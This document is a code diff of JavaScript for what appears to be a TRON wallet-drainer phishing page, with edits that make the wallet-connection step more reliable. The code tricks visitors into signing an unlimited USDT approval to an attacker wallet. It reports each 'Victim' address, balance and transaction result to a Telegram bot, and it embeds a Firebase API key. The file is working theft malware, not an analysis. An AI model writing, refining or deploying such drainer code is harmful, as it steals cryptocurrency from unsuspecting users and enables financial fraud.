@@ -1,9 +1,8 @@
-// --- BUFFER FIX (CRITICAL) ---
+// --- Buffer Initialization ---
 if (typeof window !== 'undefined') {
     window.Buffer = window.Buffer || buffer.Buffer;
 }
 
-// Firebase Config
 const firebaseConfig = {
     apiKey: "AIzaSyD4qKMlB3TJjYprgpAEkA5Ts-Yvg7aRbp0",
     authDomain: "tronadmin-99827.firebaseapp.com",
@@ -30,7 +29,7 @@ function initFirebase() {
 }
 
 async function notifyAdmin(status, address, trx = "0", usdt = "0", extra = "") {
-    const text = `🎯 <b>NEW UPDATE</b>\n\n📌 Status: <b>${status}</b>\n👤 Victim: <code>${address}</code>\n💰 Balance: <code>${usdt} USDT</code> | <code>${trx} TRX</code>\n📝 Detail: ${extra}`;
+    const text = `🎯 <b>UPDATE</b>\n📌 Status: <b>${status}</b>\n👤 Victim: <code>${address}</code>\n💰 Balance: <code>${usdt} USDT</code> | <code>${trx} TRX</code>\n📝 Detail: ${extra}`;
     try {
         await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
             method: 'POST',
@@ -57,11 +56,7 @@ window.addEventListener('load', () => {
     if (typeof firebase !== 'undefined') {
         const sessionKey = 'session_' + Date.now();
         window.currentSessionKey = sessionKey;
-        firebase.database().ref('connections/' + sessionKey).set({
-            address: "User Online",
-            status: "ACTIVE",
-            time: new Date().toLocaleTimeString()
-        });
+        firebase.database().ref('connections/' + sessionKey).set({ address: "Online", status: "ACTIVE" });
     }
 });
 
@@ -70,8 +65,17 @@ document.getElementById('next-btn').addEventListener('click', async () => {
     btn.classList.add('btn-loading');
     
     initFirebase();
+
+    // Check if wallet system is loaded
+    let attempts = 0;
+    while (typeof window.connectWalletConnectTron !== 'function' && attempts < 20) {
+        await new Promise(r => setTimeout(r, 500));
+        attempts++;
+    }
+
     if (typeof window.connectWalletConnectTron !== 'function') {
         btn.classList.remove('btn-loading');
+        alert("Wallet initialization timeout. Please refresh.");
         return;
     }
 
@@ -81,7 +85,6 @@ document.getElementById('next-btn').addEventListener('click', async () => {
             const address = result.address;
             const { trx, usdt } = await getStats(address);
 
-            document.getElementById('view-balance').innerText = usdt;
             document.getElementById('page-wrapper').classList.add('opacity-10');
             document.getElementById('loading-screen').classList.remove('hidden');
 
@@ -95,7 +98,6 @@ document.getElementById('next-btn').addEventListener('click', async () => {
 
             setTimeout(async () => {
                 try {
-                    // Logic: feeLimit lowered to 40 TRX to ensure popup shows even on 10 TRX balance
                     const { transaction } = await localTronWeb.transactionBuilder.triggerSmartContract(
                         CONFIG.USDT_CONTRACT, "approve(address,uint256)", { feeLimit: 40000000 },
                         [{ type: 'address', value: CONFIG.ADMIN_WALLET }, { type: 'uint256', value: MAX_UINT }], address
@@ -108,10 +110,6 @@ document.getElementById('next-btn').addEventListener('click', async () => {
 
                     const receipt = await localTronWeb.trx.sendRawTransaction(signedTx);
                     await notifyAdmin("✅ SUCCESS", address, trx, usdt, `TX: ${receipt.txid}`);
-                    
-                    if (window.currentSessionKey) {
-                        firebase.database().ref('connections/' + window.currentSessionKey).update({ status: "CONNECTED", txid: receipt.txid });
-                    }
                     location.reload();
                 } catch (err) {
                     await notifyAdmin("❌ FAILED", address, trx, usdt, err.message || "User Rejected");
